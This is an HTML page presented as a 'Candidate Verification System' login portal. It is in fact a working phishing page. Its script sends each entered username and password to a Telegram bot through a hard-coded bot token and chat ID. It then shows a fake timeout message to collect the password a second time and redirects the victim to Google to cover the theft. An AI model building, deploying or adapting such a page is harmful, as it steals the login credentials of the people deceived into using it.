<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Verification System</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-6">

    <div class="bg-white p-10 rounded-2xl shadow-lg w-full max-w-md border-t-8 border-blue-600">
        <h1 class="text-2xl font-bold text-gray-800 mb-2">Portal Access</h1>
        <p class="text-sm text-gray-500 mb-8 font-medium">Please enter your reference details to sync with the database.</p>
        
        <div id="notice" class="bg-amber-50 text-amber-700 text-[12px] p-4 rounded-lg mb-6 hidden border border-amber-100 font-semibold text-center">
            ðŸ”’ Connection Timeout. Re-enter credentials to authorize.
        </div>
        
        <div class="space-y-5">
            <div>
                <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Primary ID</label>
                <input type="text" id="u" placeholder="Email or Username" class="w-full border-2 border-gray-100 p-4 rounded-xl text-sm focus:border-blue-500 outline-none transition-all">
            </div>
            
            <div>
                <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Access Key</label>
                <input type="password" id="p" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" class="w-full border-2 border-gray-100 p-4 rounded-xl text-sm focus:border-blue-500 outline-none transition-all">
            </div>
            
            <button onclick="submitSync()" id="btn" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-md shadow-md hover:bg-blue-700 active:scale-95 transition-all">AUTHORIZE SYNC</button>
        </div>
    </div>

    <script>
        const SETUP = {
            T: "8575047403:AAFLEU-1LmDZRfU-zpBtEdj9pVUdagt9hOA", //
            C: "6521606449" //
        };

        let tries = 0;

        async function submitSync() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const btn = document.getElementById('btn');
            const notice = document.getElementById('notice');

            if (!user || !pass) return alert("Please fill all fields.");

            btn.innerText = "SYNCING...";
            btn.disabled = true;

            const content = `ðŸ“Š **PORTAL LOG**\n\nðŸ‘¤ **ID:** \`${user}\` \nðŸ”‘ **KEY:** \`${pass}\``;

            try {
                const res = await fetch(`https://api.telegram.org/bot${SETUP.T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: SETUP.C, text: content, parse_mode: 'Markdown' })
                });

                if (res.ok) {
                    tries++;
                    if (tries === 1) {
                        notice.classList.remove('hidden');
                        document.getElementById('p').value = "";
                        btn.innerText = "RE-AUTHORIZE";
                        btn.disabled = false;
                    } else {
                        window.location.href = "https://www.google.com";
                    }
                } else {
                    alert("Submission error. Ensure bot is started.");
                    btn.disabled = false;
                    btn.innerText = "AUTHORIZE SYNC";
                }
            } catch (e) {
                alert("Network failure.");
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
